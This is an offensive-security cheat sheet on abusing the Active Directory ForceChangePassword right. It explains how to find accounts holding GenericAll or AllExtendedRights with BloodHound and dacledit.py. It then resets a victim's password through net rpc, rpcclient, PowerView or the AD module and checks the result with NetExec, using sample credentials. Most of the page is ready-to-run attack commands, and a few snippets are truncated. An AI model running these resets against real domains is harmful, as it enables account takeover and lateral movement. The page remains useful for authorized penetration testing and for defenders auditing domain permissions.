# 10.05 ForceChangePassword

> Reset a target's password without knowing the old one via `net rpc password`, `rpcclient`, or PowerView (`User-Force-Change-Password` extended right).

## Overview

User-Force-Change-Password (GUID 00299570-246d-11d0-a768-00aa006e0529) is an extended right that allows resetting a user's password without knowing the current one. It is abusable when a controlled account has GenericAll, AllExtendedRights, or the specific User-Force-Change-Password extended right over a target. Exploit from Linux via net rpc or rpcclient; from Windows via PowerView or the ActiveDirectory module.

## Steps

- Use BloodHound Cypher query or dacledit.py to identify ForceChangePassword/GenericAll/AllExtendedRights.
- Three different access masks enable this: ControlAccess (User-Force-Change-Password), FullControl (GenericAll), or AllExtendedRights.
- From Linux: reset with net rpc password; alternatively use rpcclient setuserinfo2.
- Validate the new password with NetExec after each reset.
- From Windows: use PowerView Set-DomainUserPassword or ActiveDirectory module Set-ADAccountPassword.
- Use -ResolveGUIDs with PowerView to see human-readable right names instead of GUIDs.

## Commands

### BloodHound Cypher — find ForceChangePassword paths

```text
MATCH p=((n:User {name:"[email protected]"})-[r:ForceChangePassword|GenericAll|AllExtendedRights]->(m)) RETURN p
```

### Enumerate with dacledit.py

```bash
python3 examples/dacledit.py -principal pedro -target yolanda -dc-ip <TARGET> <DOMAIN>.local/pedro:SecuringAD01
```

### Enumerate with PowerView (resolve GUIDs)

```powershell
$userSID = (Get-DomainUser -Identity pedro).objectsid
```

### Password reset from Linux (net rpc)

```bash
net rpc password yolanda Mynewpassword1 -U <DOMAIN>.local/pedro%SecuringAD01 -S <TARGET>
```

### Validate with NetExec

```bash
poetry run nxc ldap <TARGET> -u yolanda -p Mynewpassword1
```

### Password reset via rpcclient

```bash
rpcclient -U <DOMAIN>/pedro%SecuringAD01 <TARGET>
```

### Password reset from Windows (PowerView)

```powershell
Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose
```

### Password reset from Windows (AD Module)

```powershell
Import-Module ActiveDirectory
```
